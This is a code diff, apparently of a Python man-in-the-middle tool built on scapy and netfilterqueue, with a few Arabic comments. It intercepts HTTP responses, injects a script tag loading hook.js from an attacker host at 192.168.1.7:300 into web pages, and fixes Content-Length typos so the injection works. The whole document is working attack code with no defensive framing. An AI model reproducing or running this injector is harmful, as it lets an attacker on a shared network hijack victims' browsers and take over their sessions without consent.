@@ -19,15 +19,15 @@ def process_packet(packet):
             load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
 
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] HTTP Response")
+            print("[+] HTTP Response")  # غيرت من "Request" لـ "Response"
             injection_code = b'<script src="http://192.168.1.7:300/hook.js"></script>'
             load = load.replace(b"</body>", injection_code + b"</body>")
             content_length_search = re.search(b"(?:Content-Length:\s)(\d*)", load)
 
             if content_length_search:
-                content_length = content_length_search.group(1)
-                new_content_length = int(content_lenght) + len(injection_code)
-                new_content_length = b"%d" % (new_content_lenght)
+                content_length = content_length_search.group(1)  # صح
+                new_content_length = int(content_length) + len(injection_code)
+                new_content_length = b"%d" % (new_content_length)
                 load = load.replace(content_length, new_content_length)
 
         if load != scapy_packet[scapy.Raw].load:
@@ -39,5 +39,3 @@ def process_packet(packet):
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
-
-
